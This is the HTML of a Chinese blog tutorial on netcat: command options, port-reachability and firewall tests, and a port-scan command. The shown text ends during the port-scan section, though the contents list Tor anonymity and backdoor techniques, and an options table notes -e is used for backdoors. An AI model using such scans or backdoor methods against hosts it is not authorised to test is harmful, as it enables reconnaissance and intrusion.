<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>netcat | 胡小宁的博客</title><meta name="keywords" content="programthink,小妙招,计算机网络"><meta name="author" content="胡小宁"><meta name="copyright" content="胡小宁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”文章目录 ★引子★netcat 是个啥玩意儿？★netcat 能干啥？★nc 命令行简介★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口★招数3：（渗透测试）用 nc 玩“端口扫描”★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）★招数5：">
<meta property="og:type" content="article">
<meta property="og:title" content="netcat">
<meta property="og:url" content="http://1905060202.github.io/2021/07/16/netcat/index.html">
<meta property="og:site_name" content="胡小宁的博客">
<meta property="og:description" content="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”文章目录 ★引子★netcat 是个啥玩意儿？★netcat 能干啥？★nc 命令行简介★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口★招数3：（渗透测试）用 nc 玩“端口扫描”★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）★招数5：">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-07-16T15:54:54.000Z">
<meta property="article:modified_time" content="2021-07-16T15:59:56.482Z">
<meta property="article:author" content="胡小宁">
<meta property="article:tag" content="programthink">
<meta property="article:tag" content="小妙招">
<meta property="article:tag" content="计算机网络">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://1905060202.github.io/2021/07/16/netcat/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"6456TWTNI2","apiKey":"cf5116dbc73ddb4c9ee08cca50344cf5","indexName":"bloghu","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'netcat',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-16 23:59:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/you.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">41</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">胡小宁的博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">netcat</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-16T15:54:54.000Z" title="发表于 2021-07-16 23:54:54">2021-07-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-16T15:59:56.482Z" title="更新于 2021-07-16 23:59:56">2021-07-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="netcat"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”"><a href="#扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”" class="headerlink" title="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”"></a>扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</h1><p><strong>文章目录</strong></p>
<p>★引子<br>★netcat 是个啥玩意儿？<br>★netcat 能干啥？<br>★nc 命令行简介<br>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达<br>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口<br>★招数3：（渗透测试）用 nc 玩“端口扫描”<br>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）<br>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）<br>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问<br>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）<br>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）<br>★招数9：（系统管理）用 nc 传输文件<br>★招数10：（系统管理）用 nc 远程备份整个磁盘<br>★招数11：（入侵手法）用 nc 开启【被动】连接型后门<br>★招数12：（入侵手法）用 nc 开启【主动】连接型后门<br>★附录：netcat 的【其它变种】</p>
<hr>
<h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。<br>　　由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。<br>　　今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 ……<br>　　此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">---------------------<br>|<span class="hljs-string">      /\_/\        </span>|<br>|<span class="hljs-string">     / 0 0 \       </span>|<br>|<span class="hljs-string">    ====v====      </span>|<br>|<span class="hljs-string">     \  W  /       </span>|<br>|<span class="hljs-string">     </span>|<span class="hljs-string">     </span>|<span class="hljs-string">     _ </span>|<br>|<span class="hljs-string">     / ___ \    /  </span>|<br>|<span class="hljs-string">    / /   \ \  </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   (((-----)))-&#x27;   </span>|<br>|<span class="hljs-string">    /              </span>|<br>|<span class="hljs-string">   (      ___      </span>|<br>|<span class="hljs-string">    \__.=</span>|<span class="hljs-string">___E     </span>|<br>|<span class="hljs-string">           /       </span>|<br>---------------------<br></code></pre></td></tr></table></figure>


<h2 id="★netcat-是个啥玩意儿？"><a href="#★netcat-是个啥玩意儿？" class="headerlink" title="★netcat 是个啥玩意儿？"></a>★netcat 是个啥玩意儿？</h2><p>　　netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【<strong>网络上的瑞士军刀</strong>】。<br>　　它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。</p>
<h2 id="★netcat-能干啥？"><a href="#★netcat-能干啥？" class="headerlink" title="★netcat 能干啥？"></a>★netcat 能干啥？</h2><h3 id="◇概述"><a href="#◇概述" class="headerlink" title="◇概述"></a>◇概述</h3><p>　　简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（这里所说的“传输层协议”指的是 OSI 模型中的第4层，主要是 TCP ＆ UDP）。</p>
<h3 id="◇nc-的变种"><a href="#◇nc-的变种" class="headerlink" title="◇nc 的变种"></a>◇nc 的变种</h3><p>　　由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。<br>　　由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：<strong>这篇教程的内容，主要基于 OpenBSD 社区的变种</strong>（也叫“OpenBSD netcat”或“netcat-openbsd”）<br>　　顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。<br>　　虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。<br>　　为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼【原始】的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。<br>　　另，<br>　　在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。</p>
<h2 id="★nc-命令行简介"><a href="#★nc-命令行简介" class="headerlink" title="★nc 命令行简介"></a>★nc 命令行简介</h2><p>　　要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。</p>
<h3 id="◇nc-命令行的常规形式"><a href="#◇nc-命令行的常规形式" class="headerlink" title="◇nc 命令行的常规形式"></a>◇nc 命令行的常规形式</h3><p>　　一般来说，nc 的命令行包括如下几个部分：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> 命令选项 主机 端口<br></code></pre></td></tr></table></figure>
<p><strong>命令选项</strong><br>　　这部分可能包含 0~N 个选项<br>　　（注：这部分最复杂，下一个小节单独聊）<br><strong>主机</strong><br>　　这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。<br><strong>端口</strong><br>　　这部分可能没有，可能是单个端口，可能是端口范围。<br>　　对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：<code>1-1024</code></p>
<h3 id="◇何为“命令行选项”？"><a href="#◇何为“命令行选项”？" class="headerlink" title="◇何为“命令行选项”？"></a>◇何为“命令行选项”？</h3><p>　　简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。<br>　　你要使用的选项都放在 <code>nc</code> 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。<br>　　举例：<br>　　在下面这个例子中，分别用到了三个选项（<code>l、p、v</code>），其中 <code>12345</code> 是选项 <code>p</code> 所带的【选项值】。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">12345</span> -v<br></code></pre></td></tr></table></figure>

<p>　　如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -h</span><br></code></pre></td></tr></table></figure>

<p>　　顺便说一下：在上述命令的输出中，如果第一行包含 <code>OpenBSD</code> 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。</p>
<h3 id="◇【常用的】命令行选项"><a href="#◇【常用的】命令行选项" class="headerlink" title="◇【常用的】命令行选项"></a>◇【常用的】命令行选项</h3><p>　　由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>是否有“选项值”</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>h</td>
<td>NO</td>
<td>输出 nc 的帮助</td>
</tr>
<tr>
<td>v</td>
<td>NO</td>
<td>在网络通讯时，显示详细的输出信息 注：建议新手多用该选项，出错时帮你诊断问题</td>
</tr>
<tr>
<td>n</td>
<td>NO</td>
<td>对命令行中的“主机”，【不】进行域名解析 注：如果“主机”是“点分格式”的 IP 地址，需要用该选项； 如果“主机”是“域名”形式，【不能】用该选项</td>
</tr>
<tr>
<td>p</td>
<td>YES</td>
<td>指定“端口号”</td>
</tr>
<tr>
<td>l</td>
<td>NO</td>
<td>开启“监听模式”，nc 作为【服务端】 注：如不加该选项，nc 默认作为客户端</td>
</tr>
<tr>
<td>u</td>
<td>NO</td>
<td>使用 UDP 协议 注：如不加该选项，默认是 TCP 协议</td>
</tr>
<tr>
<td>w</td>
<td>YES</td>
<td>设置连接的超时间隔（N 秒）</td>
</tr>
<tr>
<td>q</td>
<td>YES</td>
<td>让 nc 延时（N 秒）再退出</td>
</tr>
<tr>
<td>z</td>
<td>NO</td>
<td>开启“zero-I/O 模式” 注：该选项仅用于“端口扫描”，后面会聊到</td>
</tr>
<tr>
<td>k</td>
<td>NO</td>
<td>配合 <code>-l</code> 选项使用，可以重复接受客户端连接。 注：“原版 nc”的该选项用来开启“TCP keepalive” 这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>X</td>
<td>YES</td>
<td>指定代理的类型（具体用法，后面会聊到） 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>x</td>
<td>YES</td>
<td>以 <code>IP:port</code> 的格式指定代理的位置。 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>e</td>
<td>YES</td>
<td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】 注：通常用该选项开启一个网络后门 “OpenBSD 变种”基于安全考虑，已去掉该选项， 但还是能用间接的方式达到同样的效果 :)</td>
</tr>
</tbody></table>
<p>　　汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。</p>
<h3 id="◇命令行选项的【合写】形式"><a href="#◇命令行选项的【合写】形式" class="headerlink" title="◇命令行选项的【合写】形式"></a>◇命令行选项的【合写】形式</h3><p>　　有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。<br>　　还拿刚才俺举的例子，以下几种写法是【等价】滴。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">12345</span> -v<br><span class="hljs-attribute">nc</span> -l -v -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>


<h3 id="◇如何强行终止-nc？"><a href="#◇如何强行终止-nc？" class="headerlink" title="◇如何强行终止 nc？"></a>◇如何强行终止 nc？</h3><p>　　一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。<br>　　对 nc，你同样可以这么干。</p>
<h2 id="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"><a href="#★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达" class="headerlink" title="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"></a>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2><h3 id="◇使用场景"><a href="#◇使用场景" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　经常有这种需求，要判断某个主机的监听端口是否能连上。<br>　　导致监听端口【无法】，通常有两种原因：<br>其一，这个监听端口根本就【没开启】；<br>其二，监听端口虽然开启，但是被防火墙阻拦了。<br>　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启<br>　　但对于第2个原因，<code>netstat</code> 就用不上了。这时候就可以用 nc 来帮你搞定。</p>
<h3 id="◇方法"><a href="#◇方法" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　用如下命令可以测试某个 IP 地址（<code>x.x.x.x</code>）上的某个监听端口（<code>xx</code>）是否开启。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>

<p>　　上述命令用到了如下几个选项：</p>
<p><strong>选项 <code>-v</code></strong><br>　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br>　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）</p>
<p><strong>选项 <code>-n</code></strong><br>　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br>　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p>
<h3 id="◇补充说明：超时设置"><a href="#◇补充说明：超时设置" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　在测试链接的时候，如果你【没】使用 <code>-w</code> 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br>　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“<code>-w</code> 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv -w <span class="hljs-number">3</span> <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>


<h3 id="◇补充说明：UDP"><a href="#◇补充说明：UDP" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 <code>-u</code> 选项。</p>
<h2 id="★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口"><a href="#★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口"></a>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2><h3 id="◇使用场景-1"><a href="#◇使用场景-1" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br>　　现在换另一个场景：<br>　　假设你正在配置防火墙规则，禁止 TCP 的 <code>8080</code> 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br>　　更进一步说：如果当前【没有】任何软件开启 <code>8080</code> 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br>　　为了叙述方便，设想如下场景：<br>有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br>然后要判断“主机S”上的防火墙是否会拦截其它主机对 <code>8080</code> TCP 端口的连接。</p>
<h3 id="◇方法-1"><a href="#◇方法-1" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<p><strong>选项 <code>-l</code></strong><br>　　这个选项会让 nc 进入监听模式。</p>
<p><strong>选项 <code>-p</code></strong><br>　　这个选项有“选项值”，也就是具体端口号。</p>
<p>　　然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）</p>
<h3 id="◇补充说明：是否省略“-p”？"><a href="#◇补充说明：是否省略“-p”？" class="headerlink" title="◇补充说明：是否省略“-p”？"></a>◇补充说明：是否省略“-p”？</h3><p>　　某些 nc 的变种，在开启监听模式时，可以省略“<code>-p</code>”，上述命令变为如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
<p>　　但考虑到兼容性，（在后续章节中）俺总是写上 <code>-p</code> 选项。</p>
<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br>　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br>　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 <code>-k</code> 选项。</p>
<h3 id="◇补充说明：UDP-1"><a href="#◇补充说明：UDP-1" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 <code>-u</code> 选项。</p>
<h2 id="★招数3：（渗透测试）用-nc-玩“端口扫描”"><a href="#★招数3：（渗透测试）用-nc-玩“端口扫描”" class="headerlink" title="★招数3：（渗透测试）用 nc 玩“端口扫描”"></a>★招数3：（渗透测试）用 nc 玩“端口扫描”</h2><h3 id="◇使用场景-2"><a href="#◇使用场景-2" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br>　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br>　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br>　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br>　　顺便说一下：<br>不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：<code>1</code> ~ <code>65535</code></p>
<h3 id="◇方法-2"><a href="#◇方法-2" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　下面这个命令，用来扫描 IP 地址为 <code>x.x.x.x</code> 的主机，扫描的端口范围从 <code>1</code> 到 <code>1024</code></p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -znv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">1</span><span class="hljs-number">-1024</span><br></code></pre></td></tr></table></figure>

<p><strong>选项 <code>-z</code></strong><br>　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br><strong>选项 <code>-n</code></strong><br>　　（前面已聊过，参见“招数1”）<br><strong>选项 <code>-v</code></strong><br><code>-v</code> 选项前面也聊过，这里要特地强调一下。<br>　　对 nc 的其它用法，<code>-v</code> 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。</p>
